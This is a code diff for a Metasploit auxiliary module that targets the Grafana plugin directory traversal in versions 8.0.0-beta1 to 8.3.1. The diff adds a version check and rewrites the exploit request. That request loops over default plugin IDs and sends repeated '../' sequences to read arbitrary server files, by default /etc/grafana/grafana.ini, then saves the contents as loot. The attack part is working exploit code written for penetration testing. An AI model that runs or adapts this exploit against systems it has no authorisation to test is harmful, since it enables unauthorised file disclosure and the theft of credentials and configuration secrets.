@@ -11,12 +11,15 @@ class MetasploitModule < Msf::Auxiliary
       update_info(
         info,
         'Name' => 'Grafana Plugin Path Traversal',
-        'Description' => 'Sample Auxiliary Module',
+        'Description' => %q{
+          Grafana versions 8.0.0-beta1 through 8.3.0 prior to 8.0.7, 8.1.8, 8.2.7, or 8.3.1 are vulnerable to directory traversal
+          through the plugin URL.  A valid plugin ID is required, but many are installed by default.
+        },
         'Author' => [
-          'h00die' # msf module
+          'h00die', # msf module
+          'jordyv' # discovery
         ],
         'License' => MSF_LICENSE,
-        # https://github.com/rapid7/metasploit-framework/wiki/Definition-of-Module-Reliability,-Side-Effects,-and-Stability
         'Notes' => {
           'Stability' => [CRASH_SAFE],
           'Reliability' => [],
@@ -27,7 +30,8 @@ class MetasploitModule < Msf::Auxiliary
           ['URL', 'https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p'],
           ['URL', 'https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/'],
           ['EDB', '50581'],
-          ['URL', 'https://github.com/jas502n/Grafana-CVE-2021-43798']
+          ['URL', 'https://github.com/jas502n/Grafana-CVE-2021-43798'],
+          ['URL', 'https://github.com/grafana/grafana/commit/c798c0e958d15d9cc7f27c72113d572fa58545ce']
 
         ]
       )
@@ -35,14 +39,39 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(3000),
+        OptString.new('TARGETURI', [ true, 'Path to Grafana instance', '/']),
         OptString.new('FILEPATH', [true, 'The name of the file to download', '/etc/grafana/grafana.ini']),
         OptInt.new('DEPTH', [true, 'Traversal depth', 13])
       ]
     )
   end
 
-  def run
-    print_status("Running the simple auxiliary module with action #{action.name}")
+  def check
+    res = send_request_cgi!({
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path)
+    })
+    return Exploit::CheckCode::Unknown unless res && res.code == 200
+
+    /"subTitle":"Grafana v(?<version>\d{1,2}.\d{1,2}.\d{1,2}) \([0-9a-f]{10}\)",/ =~ res.body
+    return Exploit::CheckCode::Safe unless version
+
+    version = Rex::Version.new(version)
+    if version.between?(Rex::Version.new('8.0.0-beta1'), Rex::Version.new('8.0.7')) ||
+       version.between?(Rex::Version.new('8.1.0'), Rex::Version.new('8.1.8')) ||
+       version.between?(Rex::Version.new('8.2.0'), Rex::Version.new('8.2.7')) ||
+       version.between?(Rex::Version.new('8.3.0'), Rex::Version.new('8.3.1'))
+      print_good("Detected vulnerable Grafina: #{version}")
+      return Exploit::CheckCode::Appears
+    end
+    print_bad("Detected non-vulnerable Grafina: #{version}")
+    return Exploit::CheckCode::Safe
+  end
+
+  def run_host(ip)
+    check_code = check
+    return unless check_code == Exploit::CheckCode::Appears
+
     [
       'alertlist',
       'annolist',
@@ -88,11 +117,11 @@ class MetasploitModule < Msf::Auxiliary
       vprint_status("Attempting plugin: #{plugin}")
       res = send_request_cgi({
         'method' => 'GET',
-        'uri' => "/public/plugins/#{plugin}/#{'../' * datastore['DEPTH']}#{datastore['FILEPATH']}"
+        'uri' => normalize_uri(target_uri.path, 'public', 'plugins', plugin, '../' * datastore['DEPTH'], datastore['FILEPATH'])
       })
       next unless res && res.code == 200
 
-      print_good(res.body)
+      vprint_good(res.body)
       path = store_loot(
         'grafana.loot',
         'application/octet-stream',
